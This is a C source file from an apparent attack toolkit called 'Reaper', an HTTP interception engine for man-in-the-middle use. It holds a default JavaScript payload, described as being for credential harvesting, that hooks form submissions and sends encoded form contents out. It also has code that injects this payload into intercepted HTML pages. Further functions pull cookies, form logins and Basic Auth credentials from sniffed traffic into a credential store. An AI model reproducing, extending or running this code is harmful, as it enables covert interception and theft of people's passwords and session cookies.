/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER_HTTP.C - HTTP INJECTION & MANIPULATION ENGINE
 *  HTTP traffic interception and modification
 *  
 *  Features:
 *  - JavaScript payload injection
 *  - HTML content modification
 *  - Cookie extraction
 *  - SSL stripping detection
 *  - Request/Response logging
 *  
 *  Zero Dependencies | Full Stealth | Military Grade
 * ═══════════════════════════════════════════════════════════════════════════
 */

#include "reaper_core.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

/* ═══════════════════════════════════════════════════════════════════════════
 *  HTTP PARSING UTILITIES
 * ═══════════════════════════════════════════════════════════════════════════ */

// Find header value in HTTP headers
static const char* find_header(const char* headers, const char* name, int* len) {
    char search[64];
    snprintf(search, sizeof(search), "\n%s:", name);
    
    const char* pos = strcasestr(headers, search);
    if (!pos) {
        // Try at start
        snprintf(search, sizeof(search), "%s:", name);
        if (strncasecmp(headers, search, strlen(search)) == 0) {
            pos = headers - 1;
        } else {
            return NULL;
        }
    }
    
    pos = strchr(pos + 1, ':');
    if (!pos) return NULL;
    
    pos++;
    while (*pos == ' ') pos++;
    
    const char* end = pos;
    while (*end && *end != '\r' && *end != '\n') end++;
    
    if (len) *len = end - pos;
    return pos;
}

// Extract HTTP method
static int get_http_method(const char* data, char* method, int max_len) {
    int i = 0;
    while (data[i] && data[i] != ' ' && i < max_len - 1) {
        method[i] = data[i];
        i++;
    }
    method[i] = '\0';
    return i;
}

// Extract HTTP URL
static int get_http_url(const char* data, char* url, int max_len) {
    const char* start = strchr(data, ' ');
    if (!start) return -1;
    start++;
    
    const char* end = strchr(start, ' ');
    if (!end) end = strchr(start, '\r');
    if (!end) return -1;
    
    int len = end - start;
    if (len >= max_len) len = max_len - 1;
    
    strncpy(url, start, len);
    url[len] = '\0';
    
    return len;
}

// Find body in HTTP message
static const char* find_http_body(const char* data, int* body_len) {
    const char* body = strstr(data, "\r\n\r\n");
    if (body) {
        body += 4;
        if (body_len) *body_len = strlen(body);
        return body;
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  JAVASCRIPT INJECTION
 * ═══════════════════════════════════════════════════════════════════════════ */

// Default JavaScript payload for credential harvesting
static const char* DEFAULT_JS_PAYLOAD = 
    "<script>"
    "(function(){"
    "var f=document.querySelectorAll('form');"
    "for(var i=0;i<f.length;i++){"
    "f[i].addEventListener('submit',function(e){"
    "var d=new FormData(this);"
    "var p='';"
    "for(var pair of d.entries()){p+=pair[0]+'='+pair[1]+'&';}"
    "new Image().src='http://'+location.host+'/x?'+btoa(p);"
    "});"
    "}"
    "})();"
    "</script>";

// Inject JavaScript into HTML response
int reaper_inject_js(const char* html, int html_len, 
                      const char* js_payload,
                      char* output, int max_output) {
    
    if (!js_payload) js_payload = DEFAULT_JS_PAYLOAD;
    int js_len = strlen(js_payload);
    
    // Find </head> or </body> tag
    const char* inject_point = strcasestr(html, "</head>");
    if (!inject_point) {
        inject_point = strcasestr(html, "</body>");
    }
    if (!inject_point) {
        inject_point = strcasestr(html, "</html>");
    }
    if (!inject_point) {
        // No good injection point, inject at end
        if (html_len + js_len < max_output) {
            memcpy(output, html, html_len);
            memcpy(output + html_len, js_payload, js_len);
            return html_len + js_len;
        }
        return -1;
    }
    
    int prefix_len = inject_point - html;
    int suffix_len = html_len - prefix_len;
    
    if (prefix_len + js_len + suffix_len >= max_output) {
        return -1;  // Output buffer too small
    }
    
    memcpy(output, html, prefix_len);
    memcpy(output + prefix_len, js_payload, js_len);
    memcpy(output + prefix_len + js_len, inject_point, suffix_len);
    
    return prefix_len + js_len + suffix_len;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  COOKIE EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

typedef struct {
    char host[128];
    char name[64];
    char value[256];
} extracted_cookie_t;

int reaper_extract_cookies(const char* http_data, extracted_cookie_t* cookies, 
                            int max_cookies, const char* host) {
    int count = 0;
    const char* pos = http_data;
    
    // Look for Cookie: header (request) or Set-Cookie: header (response)
    while ((pos = strcasestr(pos, "Cookie:")) && count < max_cookies) {
        pos += 7;
        while (*pos == ' ') pos++;
        
        const char* end = pos;
        while (*end && *end != '\r' && *end != '\n') end++;
        
        // Parse cookie pairs
        const char* p = pos;
        while (p < end && count < max_cookies) {
            // Skip whitespace
            while (p < end && (*p == ' ' || *p == ';')) p++;
            
            // Find name=value
            const char* eq = strchr(p, '=');
            if (!eq || eq > end) break;
            
            const char* val_end = strchr(eq + 1, ';');
            if (!val_end || val_end > end) val_end = end;
            
            // Extract name
            int name_len = eq - p;
            if (name_len > 63) name_len = 63;
            strncpy(cookies[count].name, p, name_len);
            cookies[count].name[name_len] = '\0';
            
            // Extract value
            int val_len = val_end - eq - 1;
            if (val_len > 255) val_len = 255;
            strncpy(cookies[count].value, eq + 1, val_len);
            cookies[count].value[val_len] = '\0';
            
            // Set host
            strncpy(cookies[count].host, host, sizeof(cookies[count].host) - 1);
            
            count++;
            p = val_end + 1;
        }
        
        pos = end;
    }
    
    return count;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  FORM CREDENTIAL EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

// URL decode
static void url_decode(const char* src, char* dst, int max_len) {
    int i = 0, j = 0;
    while (src[i] && j < max_len - 1) {
        if (src[i] == '%' && src[i+1] && src[i+2]) {
            char hex[3] = { src[i+1], src[i+2], 0 };
            dst[j++] = (char)strtol(hex, NULL, 16);
            i += 3;
        } else if (src[i] == '+') {
            dst[j++] = ' ';
            i++;
        } else {
            dst[j++] = src[i++];
        }
    }
    dst[j] = '\0';
}

// Common username field names
static const char* USERNAME_FIELDS[] = {
    "username", "user", "email", "login", "userid", "user_id", 
    "uname", "name", "account", "id", "usr", NULL
};

// Common password field names
static const char* PASSWORD_FIELDS[] = {
    "password", "pass", "passwd", "pwd", "secret", "pw", 
    "user_password", "userpassword", "psw", NULL
};

static bool is_username_field(const char* name) {
    for (int i = 0; USERNAME_FIELDS[i]; i++) {
        if (strcasecmp(name, USERNAME_FIELDS[i]) == 0) return true;
    }
    return false;
}

static bool is_password_field(const char* name) {
    for (int i = 0; PASSWORD_FIELDS[i]; i++) {
        if (strcasecmp(name, PASSWORD_FIELDS[i]) == 0) return true;
    }
    return false;
}

int reaper_extract_form_creds(const char* post_body, int body_len,
                               char* username, int uname_max,
                               char* password, int pass_max) {
    username[0] = '\0';
    password[0] = '\0';
    
    // Parse URL-encoded form data
    char body_copy[4096];
    int copy_len = body_len < 4095 ? body_len : 4095;
    strncpy(body_copy, post_body, copy_len);
    body_copy[copy_len] = '\0';
    
    char* saveptr;
    char* pair = strtok_r(body_copy, "&", &saveptr);
    
    while (pair) {
        char* eq = strchr(pair, '=');
        if (eq) {
            *eq = '\0';
            char* name = pair;
            char* value = eq + 1;
            
            char decoded_value[256];
            url_decode(value, decoded_value, sizeof(decoded_value));
            
            if (is_username_field(name) && strlen(decoded_value) > 0) {
                strncpy(username, decoded_value, uname_max - 1);
                username[uname_max - 1] = '\0';
            }
            else if (is_password_field(name) && strlen(decoded_value) > 0) {
                strncpy(password, decoded_value, pass_max - 1);
                password[pass_max - 1] = '\0';
            }
        }
        
        pair = strtok_r(NULL, "&", &saveptr);
    }
    
    return (username[0] && password[0]) ? 1 : 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  HTTP BASIC AUTH EXTRACTION
 * ═══════════════════════════════════════════════════════════════════════════ */

// Simple base64 decode
static int base64_decode(const char* src, char* dst, int max_len) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    
    int i = 0, j = 0;
    uint32_t buf = 0;
    int bits = 0;
    
    while (src[i] && j < max_len - 1) {
        char c = src[i++];
        if (c == '=') break;
        
        const char* p = strchr(b64, c);
        if (!p) continue;
        
        buf = (buf << 6) | (p - b64);
        bits += 6;
        
        while (bits >= 8 && j < max_len - 1) {
            bits -= 8;
            dst[j++] = (buf >> bits) & 0xFF;
        }
    }
    
    dst[j] = '\0';
    return j;
}

int reaper_extract_basic_auth(const char* http_data,
                               char* username, int uname_max,
                               char* password, int pass_max) {
    int hdr_len;
    const char* auth = find_header(http_data, "Authorization", &hdr_len);
    if (!auth) return 0;
    
    // Check for "Basic " prefix
    if (strncasecmp(auth, "Basic ", 6) != 0) return 0;
    
    auth += 6;
    
    // Decode base64
    char decoded[256];
    base64_decode(auth, decoded, sizeof(decoded));
    
    // Split by ':'
    char* colon = strchr(decoded, ':');
    if (!colon) return 0;
    
    *colon = '\0';
    strncpy(username, decoded, uname_max - 1);
    username[uname_max - 1] = '\0';
    
    strncpy(password, colon + 1, pass_max - 1);
    password[pass_max - 1] = '\0';
    
    return 1;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  PROCESS HTTP PACKET
 * ═══════════════════════════════════════════════════════════════════════════ */

int reaper_process_http(reaper_session_t* session, captured_packet_t* pkt) {
    const char* data = (const char*)pkt->data;
    int data_len = pkt->length;
    
    if (data_len < 10) return 0;
    
    // Get host
    char host[128] = "";
    reaper_extract_http_host((uint8_t*)data, data_len, host, sizeof(host));
    if (host[0] == '\0') {
        inet_ntop(AF_INET, &pkt->dst_ip, host, sizeof(host));
    }
    
    // Check for HTTP request
    if (reaper_is_http_request((uint8_t*)data, data_len)) {
        char method[16], url[512];
        get_http_method(data, method, sizeof(method));
        get_http_url(data, url, sizeof(url));
        
        // Check for POST with credentials
        if (strcmp(method, "POST") == 0) {
            int body_len;
            const char* body = find_http_body(data, &body_len);
            
            if (body && body_len > 0) {
                char username[256], password[256];
                
                if (reaper_extract_form_creds(body, body_len, 
                                               username, sizeof(username),
                                               password, sizeof(password))) {
                    // Found credentials!
                    harvested_cred_t cred;
                    memset(&cred, 0, sizeof(cred));
                    cred.timestamp = time(NULL);
                    cred.protocol = PROTO_HTTP;
                    cred.src_ip = pkt->src_ip;
                    cred.dst_ip = pkt->dst_ip;
                    cred.dst_port = pkt->dst_port;
                    strncpy(cred.host, host, sizeof(cred.host) - 1);
                    strncpy(cred.username, username, sizeof(cred.username) - 1);
                    strncpy(cred.password, password, sizeof(cred.password) - 1);
                    snprintf(cred.raw_data, sizeof(cred.raw_data), 
                             "POST %s", url);
                    
                    cred_store_add(&session->cred_store, &cred);
                    session->creds_harvested++;
                }
            }
        }
        
        // Check for Basic Auth
        char username[256], password[256];
        if (reaper_extract_basic_auth(data, username, sizeof(username),
                                       password, sizeof(password))) {
            harvested_cred_t cred;
            memset(&cred, 0, sizeof(cred));
            cred.timestamp = time(NULL);
            cred.protocol = PROTO_HTTP;
            cred.src_ip = pkt->src_ip;
            cred.dst_ip = pkt->dst_ip;
            cred.dst_port = pkt->dst_port;
            strncpy(cred.host, host, sizeof(cred.host) - 1);
            strncpy(cred.username, username, sizeof(cred.username) - 1);
            strncpy(cred.password, password, sizeof(cred.password) - 1);
            strncpy(cred.raw_data, "Basic Auth", sizeof(cred.raw_data) - 1);
            
            cred_store_add(&session->cred_store, &cred);
            session->creds_harvested++;
        }
        
        // Log request if enabled
        if (session->http_config.log_requests) {
            printf("\r\033[K[HTTP] %s %s%s\n", method, host, url);
            fflush(stdout);
        }
    }
    
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  SSL STRIPPING DETECTION
 * ═══════════════════════════════════════════════════════════════════════════ */

bool reaper_detect_https_redirect(const char* http_data, int data_len) {
    // Check for 3xx redirect to HTTPS
    if (strncmp(http_data, "HTTP/1", 6) != 0) return false;
    
    // Get status code
    const char* status = strchr(http_data, ' ');
    if (!status) return false;
    status++;
    
    int code = atoi(status);
    if (code < 300 || code >= 400) return false;
    
    // Check Location header for HTTPS
    int loc_len;
    const char* location = find_header(http_data, "Location", &loc_len);
    if (!location) return false;
    
    return (strncmp(location, "https://", 8) == 0);
}

/* ═══════════════════════════════════════════════════════════════════════════
 *  HTTP INJECTION THREAD
 * ═══════════════════════════════════════════════════════════════════════════ */

void* reaper_http_thread(void* arg) {
    reaper_session_t* session = (reaper_session_t*)arg;
    captured_packet_t pkt;
    
    while (session->running) {
        // Get packet from ring buffer
        if (ring_buffer_pop(&session->packet_buffer, &pkt) < 0) {
            usleep(10000);
            continue;
        }
        
        // Process HTTP if enabled
        if (session->mode & (REAPER_MODE_HTTP_INJECT | REAPER_MODE_HARVEST)) {
            if (pkt.protocol == PROTO_HTTP) {
                reaper_process_http(session, &pkt);
            }
        }
    }
    
    return NULL;
}
